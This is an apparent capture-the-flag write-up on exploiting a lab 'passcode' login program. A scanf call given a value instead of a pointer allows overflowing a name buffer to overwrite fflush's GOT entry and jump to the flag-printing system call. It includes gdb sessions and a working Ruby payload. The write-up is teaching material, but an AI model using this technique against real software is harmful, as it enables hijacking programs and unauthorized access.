# passcode Writeup

In this challenege you will defeat a login program with a bug the user accidentally left in.

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;       
}
```

## Discovery
First thing we want to do is to look at the source code. Looking over the code might not make it 100% clear where the bug is, however with a little testing we can learn some interesting things about this program.

Let's try running the program normally.

```bash
passcode@ubuntu:~$ ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Ian
Welcome Ian!
enter passcode1 : 123456
Segmentation fault
```
Whoa. That's interesting!

Next, we want to try running to program and see where there could be a vulnerability. We see that the `name[]` array has a size of 100. Let's try 100 A's.
```bash
passcode@ubuntu:~$ ruby -e "puts ?A*100" | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
enter passcode1 : enter passcode2 : checking...
Login Failed!
```

Curious! What could be causing this? We are going to want to jump into our debugging enviroment and figure it out.
### GDB

First thing we want to do is get a list of all the functions.
```bash
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080483e0  _init
0x08048420  printf@plt
0x08048430  fflush@plt
0x08048440  __stack_chk_fail@plt
0x08048450  puts@plt
0x08048460  system@plt
0x08048470  __gmon_start__@plt
0x08048480  exit@plt
0x08048490  __libc_start_main@plt
0x080484a0  __isoc99_scanf@plt
0x080484b0  _start
0x080484e0  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048564  login
0x08048609  welcome
0x08048665  main
0x080486a0  __libc_csu_init
0x08048710  __libc_csu_fini
0x08048712  __i686.get_pc_thunk.bx
0x08048720  __do_global_ctors_aux
0x0804874c  _fini
(gdb) 
```

We are particularly interested in the `login` function since that seems to be the one that is vulnerable. Let's `disas login` and take a look.

```bash
(gdb) disas login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
(gdb) 
```
We want to set a breakpoint on the first `scanf` we see, and give it a run.

```bash
(gdb) b *0x08048586
Breakpoint 1 at 0x8048586
(gdb) b *0x0804858b
Breakpoint 2 at 0x804858b
(gdb) run
Starting program: /home/passcode/passcode 
Toddler's Secure Login System 1.0 beta.
enter you name : Ian
Welcome Ian!

Breakpoint 1, 0x08048586 in login ()
(gdb) c
Continuing.
enter passcode1 : 123

Program received signal SIGSEGV, Segmentation fault.
0xf75d2357 in _IO_vfscanf () from /lib32/libc.so.6
(gdb) 
```
Now we know that the `SIGSEGV` is happening in the `scanf`! But why? But how? Let's try to dive a little deeper into this. Let's see what happens when we put 100 A's into the program.

```bash
(gdb) b *0x08048586
Breakpoint 1 at 0x8048586
(gdb) b *0x0804858b
Breakpoint 2 at 0x804858b
(gdb) run < /tmp/input.txt
Starting program: /home/passcode/passcode < /tmp/input.txt
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

Breakpoint 1, 0x08048586 in login ()
(gdb) c
Continuing.

Breakpoint 2, 0x0804858b in login ()
(gdb) 
```

We hit the second breakpoint. Whatever we did, it had some sort of effect on the outcome, maybe there is something more to this.

Upon closer inspection of the source code, you can see that `scanf` is called directly with the value of `passcode1`, not it's pointer. This presents a write-what-where vulnerability. We can write anything to anywhere so long as we can overwrite the value of `passcode1` before the `scanf`. 

Let's try fuzzing information into the program and see if we can see it show up.

```bash
passcode@ubuntu:~$ ruby -e "100.times { |x| print (x+60).chr}; print ?\x0a" > /tmp/input.txt
passcode@ubuntu:~$ gdb passcode
(gdb) b *0x08048586
Breakpoint 1 at 0x8048586
(gdb) run < /tmp/input.txt
Starting program: /home/passcode/passcode < /tmp/input.txt
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome <=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~��������������������������������!

Breakpoint 1, 0x08048586 in login ()
(gdb) info registers
eax            0x8048783	134514563
ecx            0x0	0
edx            0x9f9e9d9c	-1616994916
ebx            0x0	0
esp            0xffb8a4e0	0xffb8a4e0
ebp            0xffb8a508	0xffb8a508
esi            0xf7783000	-143118336
edi            0xf7783000	-143118336
eip            0x8048586	0x8048586 <login+34>
eflags         0x282	[ SF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) 
```

Basically, we put bytes 60-160 into an input file, run `gdb`, set our breakpoint at the `scanf` call, run using the input, then check the registers. We can see `edx` is `0x9f9e9d9c` which are sequential bytes, meaning our data leaked into `edx` from our `name` char array. We were 60 bytes in, `0x9c` = 156, `0x9f` = 159. 156-60 is 96, meaning we are 96 bytes in when we start overwriting information. `edx` is filled with this value to give to `scanf` as a place to put `passcode1`. How can we use this to our advantage?

If one was to step into the function call of `scanf` and `disas` you'll see this.
```
(gdb) disas login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
=> 0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
(gdb) si
0x080484a0 in __isoc99_scanf@plt ()
(gdb) disas
Dump of assembler code for function __isoc99_scanf@plt:
=> 0x080484a0 <+0>:	jmp    *0x804a020
   0x080484a6 <+6>:	push   $0x40
   0x080484ab <+11>:	jmp    0x8048410
End of assembler dump.
(gdb) 
```

The instruction at `0x080484a0` says `jmp *0x804a020`. This translates to, jump `eip` to the address contained in the value of the address `0x804a020` All external function calls are done like this, meaning that if we could overwrite the value at one of these addresses and call the function, it will allow us to jump anywhere in the program. When looking at the function calls after `scanf` we see `fflush`, lets see if we can take advantage of it!

First, we need `fflush`'s `jmp` address, which can get by setting a breakpoint at the call to the function in `login` and stepping in.
```
(gdb) b *0x08048593
Breakpoint 2 at 0x8048593
(gdb) c
Continuing.

Breakpoint 2, 0x08048593 in login ()
(gdb) si
0x08048430 in fflush@plt ()
(gdb) disas
Dump of assembler code for function fflush@plt:
=> 0x08048430 <+0>:	jmp    *0x804a004
   0x08048436 <+6>:	push   $0x8
   0x0804843b <+11>:	jmp    0x8048410
End of assembler dump.
(gdb) 
```
Our address is `0x0x804a004`, this is what we will be sticking into `passcode1`, now lets find the address of our winner winner chicken dinner function. We see in `login` a `system` call, we can safely say `0x080485e3` is it.

When we look at `passcode.c` we see the `passcode1` input only will accept a decimal number via the format string `"%d"`. therefore, we will want to take our winner winner address and convert it into decimal, `134514147`.

With all this information we can write the solution now!

## Solution
First we pad our name with 96 A's, then put the address of `fflush`'s `jmp` in in little endian format, followed by the our winner address `134514147`.

```bash
passcode@ubuntu:~$ ruby -e "puts 96*?A + ?\x04 + ?\xa0 + ?\x04 + ?\x08 + 134514147.to_s" > /tmp/input.txt
-e:1:in `*': String can't be coerced into Fixnum (TypeError)
	from -e:1:in `<main>'
passcode@ubuntu:~$ ruby -e "puts ?A*96 + ?\x04 + ?\xa0 + ?\x04 + ?\x08 + 134514147.to_s" > /tmp/input.txt
passcode@ubuntu:~$ ./passcode < /tmp/input.txt
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
Sorry mom.. I got <KEY>
enter passcode1 : Now I can safely trust you that you have credential :)
passcode@ubuntu:~$ 
```
